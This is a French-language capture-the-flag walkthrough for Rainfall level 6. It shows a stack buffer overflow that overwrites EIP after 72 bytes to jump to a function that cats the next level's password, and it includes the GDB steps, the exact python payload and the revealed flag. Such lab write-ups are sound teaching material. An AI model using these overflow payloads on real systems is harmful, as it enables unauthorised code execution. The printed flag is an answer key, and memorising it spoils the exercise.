# Rainfall - Flag 6

---

## ⚡ Objectif

Exploiter un **buffer overflow** pour rediriger l'exécution vers une fonction déjà présente dans le binaire qui affiche directement le flag.

---

## 📂 Analyse initiale

```bash
$ ./level6
Segmentation fault (core dumped)
```

Le binaire plante immédiatement. Il est probable qu'un buffer overflow soit en cause.

---

## 🔍 Test du binaire

```bash
$ ./level6 aaa
Nope
```

Le programme prend un argument. Testons un overflow avec un payload plus long.

---

## 🛠️ Analyse avec GDB

### 1. Génération du pattern

Tu peux utiliser [Wiremask](https://wiremask.eu/tools/pattern_create/) pour générer un pattern personnalisé de 200 caractères.

```bash
$ ./level6 <pattern_wiremask_200>
```

### 2. Analyse du crash

Dans GDB :

```bash
$ gdb ./level6
(gdb) run <pattern_wiremask_200>
# Crash !
(gdb) i r eip
EIP: 0x37674136 ('6Ag7')
```

Trouvons l’offset avec [Wiremask pattern offset](https://wiremask.eu/tools/pattern_offset/) : **72 octets**.

Donc, **l’EIP est contrôlé après 72 octets**.

---

## 🔬 Trouver une fonction utile

Dans le dump des fonctions (`objdump -d ./level6` ou `info functions` dans GDB), on remarque une fonction appelée `n` :

```
0x08048454 <n>
```

Explorons son contenu avec :

```bash
(gdb) disas n
```

On y trouve :

```asm
movl $0x80485f0,(%esp)
call 0x80483b0 <system@plt>
```

On voit donc que `n()` appelle `system()` avec comme argument l’adresse d’une chaîne statique.

On peut retrouver cette chaîne avec :

```bash
(gdb) x/s 0x80485f0
0x80485f0: "/bin/cat /home/user/level7/.pass"
```

Donc, **la fonction `n()` appelle bien la commande pour afficher le flag**.

---

## 🎯 Exploit final

Une fois l’offset connu (72), et l’adresse de la fonction identifiée (`0x08048454`), on injecte cette adresse à la place de l’EIP.

```bash
$ ./level6 $(python -c "print 'A'*72 + '\x54\x84\x04\x08'")
```

---

## 🔐 Récupération du flag

```bash
$ ./level6 $(python -c "print 'A'*72 + '\x54\x84\x04\x08'")
...
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

---

## 📅 Récapitulatif

* ✅ Vulnérabilité : **Buffer Overflow**
* ✅ Offset pour contrôler EIP : **72 octets** (trouvé avec Wiremask)
* ✅ Fonction utile : `n()`
* ✅ Appelle : `system("/bin/cat /home/user/level7/.pass")`
* ✅ Adresse à injecter : `0x08048454`
* ✅ Payload final : `'A'*72 + '\x54\x84\x04\x08'`
* ✅ Le flag est affiché automatiquement sans shell interactif
